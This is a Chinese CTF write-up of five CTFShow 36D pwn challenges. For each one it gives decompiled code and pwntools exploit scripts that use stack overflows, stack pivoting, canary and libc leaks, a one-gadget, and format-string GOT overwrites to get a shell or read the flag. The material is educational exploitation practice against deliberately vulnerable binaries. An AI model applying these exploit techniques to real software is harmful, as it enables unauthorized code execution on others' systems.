# CTFShow 36D

首先，这个域名就很秀 -> ctf.show

其次，题目质量还不错~

## PWN_签到 (344pt)
- 题目描述：
  
    > none
- 题目附件：[pwn0](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/pwn0/pwn0)
- 考察点：bof、bash
- 难度：简单

### 程序分析

`main`程序就是入门的栈溢出，还给了`system`函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-20h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  gets(&v4, 0LL);
  system("echo hello wrold!");
  return 0;
}
```

参数`sh`也给了：

```c
pwndbg> search sh
pwn0            0x601040 0x6873 /* 'sh' */
```

### 解题思路

#### 解法1

直接执行`system("sh")`的时候虽然拿到了shell，但是shell做了过滤，不能用cat和空格，于是用`base64<flag`输出flag:

```c
[*] Switching to interactive mode
[DEBUG] Received 0x79 bytes:
    "/bin/bash: line 1: unexpected EOF while looking for matching ``'\n"
    '/bin/bash: line 2: syntax error: unexpected end of file\n'
/bin/bash: line 1: unexpected EOF while looking for matching ``'
/bin/bash: line 2: syntax error: unexpected end of file
$ base64<flag
[DEBUG] Sent 0xc bytes:
    'base64<flag\n'
[DEBUG] Received 0x3d bytes:
    'ZmxhZ3tkNzVmODU0Ny1kOTZjLTQ2ZTUtYjZlOC05ZmMxYWJmYjc3MDh9Cg==\n'
ZmxhZ3tkNzVmODU0Ny1kOTZjLTQ2ZTUtYjZlOC05ZmMxYWJmYjc3MDh9Cg==
```

#### 解法2

还有一种解法就是不用给的`sh`，直接去执行`base64<flag`

```python
offset = cyclic_find(0x6161616b)
payload = 'base64<flag && '.ljust(offset,'a')
payload += p64(0x400653) # call system
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/pwn0)



## PWN_MagicString (434pt)
- 题目描述：
  
    > none
- 题目附件：[PWN_MagicString](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/PWN_MagicString/PWN_MagicString)
- 考察点：栈迁移
- 难度：中等

### 程序分析

这题和签到那题差不多，就是没直接给`sh`这个字符串，给了`system`，因此也不需要泄漏libc，想办法弄出个`/bin/sh`就行，`main`函数如下，还是简单的栈溢出。

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-2A0h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  system("echo Throw away ida pro!!! I want a girlfriend!");
  gets(&v4, 0LL);
  return 0;
}
```

### 解题思路
#### 栈迁移

栈溢出可以覆盖`rbp`，然后用下面这段代码可以完成栈迁移，迁到`bss`段，同时再调用一次`gets`，把`"/bin/sh"`也读到`bss`段。

```nasm
.text:00000000004006C1    call    _gets
.text:00000000004006C6    mov     eax, 0
.text:00000000004006CB    leave
.text:00000000004006CC    retn
```

栈迁移后，通过`gets`在`bss`段布置`rop`链和字符串，就可以在`bss`段完成`rop`攻击拿到shell了。

全部流程如下：

```python
# rop1
offset = 680-8
payload = 'A'*offset
payload += p64(elf.bss()+0x800)
payload += p64(prdi) + p64(elf.bss()+0x800) + p64(0x4006c1) 
ru('Throw away ida pro!!! I want a girlfriend!\n')
sl(payload)
```

> 栈迁移，通过`pop rdi;ret`这个gadget设置`gets`的参数。

```python
# rop2
pl2 = 'AAAAAAAA'+ p64(prdi+1) + p64(prdi) + p64(elf.bss()+0x828) + p64(elf.sym['system']) + 'base64<flag\0\0\0\0\0'
sl(pl2)
```

> 这里因为不知道是不是和签到一样，有过滤了，就执行的base<flag

> `system`用的栈空间比较大，所以选用`bss+0x800`

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/PWN_MagicString) 

啊~好像有后门，我没看见....

## PWN_MengxinStack (526pt)

- 题目描述：
  
    > none
    
- 题目附件：[mengxin](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/mengxin/mengxin)

- 考察点：ret2libc_start_main

- 难度：中等

### 程序分析

#### 保护机制

```c
[*] '/home/taqini/Downloads/36D/mengxin/mengxin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

>  `Partial RELRO`  可以修改GOT表，不过这题好像用不上

#### 栈溢出

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  int v3; // ST0C_4
  char buf; // [rsp+10h] [rbp-40h]
  unsigned __int64 v6; // [rsp+38h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("She said: hello?");
  v3 = read(0, &buf, 0x100uLL) - 1;
  printf("%s", &buf);
  read(0, &buf, 0x100uLL);
  puts("You had me at hello.");
  return 0;
}
```

有两个`read(0, &buf, 0x100uLL)`，第一个读完了打印`buf`，可以用来泄漏`canary`，第二个用来覆盖返回地址。

### 解题思路

#### 泄漏canary

要想覆盖返回地址，就需要先泄漏canary，这个可以用第一次read实现。

```c
  char buf; // [rsp+10h] [rbp-40h]
  unsigned __int64 v6; // [rsp+38h] [rbp-18h]
  v6 = __readfsqword(0x28u);
```

从这里可以看出，`v6`是`canary`，位于`buf`后方，offset=0x38-0x10=`40`，但是canary的最后一个字节是`\x00`，因此可以向`buf`中写`41`个字节，打印的时候带出`cancay`，然后还原末尾的`\x00`就是canary的实际值。

#### 泄漏libc

得到`canary`之后，要想完成攻击，还需要泄漏libc，这个可以用同样的方法，泄漏栈中的返回地址，即`__libc_start_main+243`

但是泄漏完canary后，程序中已经没有可以用来输出的函数了，因此要想办法重复利用`printf`来泄漏libc

####  ret2libc_start_main

这个可以通过第二个read，覆盖返回地址`__libc_start_main+243`的最后一个字节，ret2csu，重新调用main函数。

```nasm
.text:0000000000020803    mov     [rsp+0B8h+var_48], rax
.text:0000000000020808    lea     rax, [rsp+0B8h+var_98]
.text:000000000002080D    mov     fs:300h, rax
.text:0000000000020816    mov     rax, cs:environ_ptr_0
.text:000000000002081D    mov     rsi, [rsp+0B8h+var_B0]
.text:0000000000020822    mov     edi, [rsp+0B8h+var_A4]
.text:0000000000020826    mov     rdx, [rax]
.text:0000000000020829    mov     rax, [rsp+0B8h+var_A0]
.text:000000000002082E    call    rax
.text:0000000000020830
.text:0000000000020830 loc_20830:  ; CODE XREF: __libc_start_main+134↓j
.text:0000000000020830    mov     edi, eax
.text:0000000000020832    call    exit
```

`0x20830`这个是返回地址，他上面那条`call rax`就是去调用`main`，所以把返回地址稍微往上改一点，改成`0x020816`，就可以再次调用`main`

#### getshell

第二次泄漏完libc就可以常规的覆盖返回地址为`system("/bin/sh")`了

总体流程如下：

```python
# round1
sea('She said: hello?\n',cyclic(41))
ru(cyclic(41))
canary = uu64('\0'+rc(7))
info_addr('canary',canary)

payload = cyclic(40)+p64(canary)
payload+= cyclic(24)+'\x16' # ret2libc_start_main
se(payload)
```

> 泄漏canary、 ret2libc_start_main

```python
# round2
sea('She said: hello?\n',cyclic(72))
ru(cyclic(72))
libc_start_main_ret = uu64(rc(6))
libcbase = libc_start_main_ret - 0x20830

prdi = 0x0000000000021102 + libcbase # pop rdi ; ret
system = libc.sym['system'] + libcbase
binsh = libc.search('/bin/sh').next() + libcbase

pl2 = cyclic(40)+p64(canary)
pl2+= cyclic(24)
pl2+= p64(prdi) + p64(binsh) + p64(system)
sl(pl2)
```

> 泄漏libc，rop执行`system("/bin/sh")`

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/mengxin) 

## PWN_tang (588pt)
- 题目描述：
  
    > none
- 题目附件：[tang](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/tang/tang)
- 考察点：格式化字符串、ret2libc_start_main
- 难度：中等

### 程序分析
这题和mengxin那题差不多，就是多了个格式化字符串漏洞，泄漏libc和canary的方式改为用`%p`泄漏，剩下的都一样了。就不过多分析了。

### 解题思路
```python
sea('你怎么了？\n','%9$p') # canary
canary = eval(rc(18))
info_addr('canary',canary)
sea('烫烫烫烫烫烫烫烫烫烫烫烫\n','TaQini')

payload = cyclic(56)+p64(canary)
payload = payload.ljust(88,'T')
payload += '\x16'  # ret2libc_start_main
sea('...你把手离火炉远一点！\n',payload)
```

> 泄漏canary、ret2libc_start_main

```python
# round2
sea('你怎么了？\n','%23$p') # canary
libc_start_main_ret = eval(rc(14))
info_addr('libc_start_main_ret',libc_start_main_ret)
libcbase = libc_start_main_ret - 0x20830
info_addr('libcbase',libcbase)
og = libcbase + 0xf1147
sea('烫烫烫烫烫烫烫烫烫烫烫烫\n','TaQini')

pl2 = cyclic(56)+p64(canary)
pl2 = pl2.ljust(88,'Q')
pl2 += p64(og)
sea('...你把手离火炉远一点！\n',pl2)
```

> 泄漏libc、one gadget

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/tang) 

## PWN_babyFmtstr (526pt)
- 题目描述：
  
    > none
- 题目附件：[PWN_babyFmtstr](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/PWN_babyFmtstr/PWN_babyFmtstr)
- 考察点：格式化字符串
- 难度：一般

### 程序分析
看题目名，应该是个有**格式化字符串漏洞**的题，主函数如下：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  char *ptr; // ST08_8
  char *v4; // ST10_8

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  ptr = fsb();
  v4 = motto();
  printf("your motto is \"%s\"\n", v4);
  free(ptr);
  free(v4);
  return 0LL;
}
```

#### 格式字符串漏洞

其中`fsb`函数中存在格式化字符串漏洞：

```c
char *fsb(){
  char *v0; // ST08_8
  char s; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sleep(0);
  puts("please input name:");
  read_n((__int64)&s, 0x32uLL);
  v0 = strdup(&s);
  printf("Hello ", 50LL, sleep);
  printf(&s);
  return v0;
}
```

> 可以输入长度小于等于50字节的格式化字符串

#### 程序保护

查看程序保护机制，发现是`Partial RELRO`，因此可以改写GOT表

```c
checksec PWN_babyFmtstr 
[*] '/home/taqini/Downloads/36D/babyfmt/PWN_babyFmtstr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 解题思路

利用格式化字符串漏洞，将程序末尾的`free`函数的GOT表改写为`main`，让程序重复执行，同时泄漏libc

再次利用格式化字符串漏洞，改某函数GOT表，最终执行`system(cmd)`，拿到flag。

> 这题其实不难，GOT表可改写，再有一个printf就基本上能getshell了。但是比赛的时候我没注意到平台服务器是香港的，用`%Nc%hn`的时候会输出太多空格，导致有时没法正确得到程序输出的数据，所以我选择攻击点的时候就比较保守，格式化字符串中用的也是`%hhn`，一字节一字节改的，导致这题最终的解法有点绕远。。

#### 重复执行+泄漏libc

程序首次执行到`free`时，GOT表中的值(0x4009d6)是`plt+6`，在代码段：

```c
[0x602040] free@GLIBC_2.2.5 -> 0x4009d6 (free@plt+6) ◂— push   5
```

因此，修改`free`的GOT表后两字节，即可将其改为`main`(0x400E93)

```python
fmt0 = '%14c%12$hhn%133c%13$hhn%25$pAAAA'
fmt0+= p64(elf.got['free']+1)+p64(elf.got['free'])
sla('please input name:\n',fmt0)
```

同时，利用`%25$p`，泄漏`main`的返回地址`libc_start_main+243`，随后可以计算出libc基址

```python
data = ru('AAAA')
log.hexdump(data[-14:])
libc_start_main_ret = eval(data[-14:])
info_addr('leak',libc_start_main_ret)
libcbase = libc_start_main_ret - 0x20830
info_addr('libcbase',libcbase)
```

#### getflag

> 签到那题对`cat`、空格等等等等做了过滤，不知道这题有没有，所以选择直接执行`system("base64<flag")`

`main`函数的最后会`free`掉我们输入的字符串，因此最简单的解法就是改`free`的got表为`system`，但是`free`在之前的操作中已经被占用了，所以这里要稍微绕一下。

在格式化字符串漏洞的函数执行过后，有下面这个函数：

```c
char *motto(){
  _QWORD *v0; // rax
  __int64 sz; // [rsp+0h] [rbp-420h]
  char *v3; // [rsp+8h] [rbp-418h]
  char buf; // [rsp+10h] [rbp-410h]
  unsigned __int64 v5; // [rsp+418h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("please input size of motto:");
  sz = get_ll();
  if ( sz < 0 )
    sz = -sz;
  if ( sz > 1024 )
    sz = 1024LL;
  puts("please input motto:");
  read_n((__int64)&buf, sz);
  v3 = strdup(&buf);
  if ( (unsigned __int8)sub_400B96((__int64)&buf) ^ 1 )
  {
    v0 = (_QWORD *)__cxa_allocate_exception(8LL);
    *v0 = "The format of motto is error!";
    __cxa_throw((__int64)v0, (__int64)&`typeinfo for'char const*, 0LL);
  }
  return v3;
}
```

```c
signed __int64 __fastcall sub_400B96(__int64 buf){
  int i; // [rsp+14h] [rbp-4h]
  for ( i = 0; *(i + buf); ++i ){
    if ( *(i + buf) <= 0x1F || *(i + buf) == 0x7F )
      return 0LL;
  }
  return 1LL;
}
```

> 当输入的字符串中出现`0x7f`或是小于`0x1f`的字节时，就会抛出异常。

在不抛出异常的时候，这些异常处理函数是用不到的，所以可以选择修改异常处理函数的GOT表，比如改`__cxa_throw`

```python
system = libcbase + libc.sym['system']
info_addr('system',system)

arg0=(system)&0xff
arg1=(system&0xff00)>>8
arg2=(system&0xff0000)>>16
arg3=(system&0xff000000)>>24
arg4=(system&0xff00000000)>>32
arg5=(system&0xff0000000000)>>40


fmt1 = '%'+str(arg0)+'c%12$hhn%'+str((arg1-arg0+0x100)%0x100)+'c%13$hhn'
fmt1 = fmt1.ljust(32,'B')
fmt1+= p64(elf.got['__cxa_throw'])+p64(elf.got['__cxa_throw']+1)

sl(fmt1)
sl('20')
sl(cyclic(10))

fmt2 = '%'+str(arg2)+'c%12$hhn%'+str((arg3-arg2+0x100)%0x100)+'c%13$hhn'
fmt2 = fmt2.ljust(32,'C')
fmt2+= p64(elf.got['__cxa_throw']+2)+p64(elf.got['__cxa_throw']+3)

sl(fmt2)
sl('20')
sl(cyclic(10))

fmt3 = '%'+str(arg4)+'c%12$hhn%'+str((arg5-arg4+0x100)%0x100)+'c%13$hhn'
fmt3 = fmt3.ljust(32,'C')
fmt3+= p64(elf.got['__cxa_throw']+4)+p64(elf.got['__cxa_throw']+5)

sl(fmt3)
sl('20')
sl(cyclic(10))
```

> 一次改两字节，一共改三次

改完之后还需要去触发这个函数，这个不难，直接再改一次free的got表，改到`__cxa_throw@plt`即可。

```nasm
   0x400a30 <__cxa_throw@plt>:	jmp    QWORD PTR [rip+0x20163a]
   0x400a36 <__cxa_throw@plt+6>:	push   0xb
   0x400a3b <__cxa_throw@plt+11>:	jmp    0x400970
```

> 这样既可以利用`free`的参数`"base64<flag"`，又可以执行`system`

```python
fmt4 = 'base64<flag&&%2595c%12$hnAAAAAAA'+p64(elf.got['free'])
sl(fmt4)
sl('20')
sl('base64<flag')
```

>最后一次了，不需要收数据了，就用的`%hn`

最终，执行`system("base64<flag")`打印flag

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/PWN_babyFmtstr) 


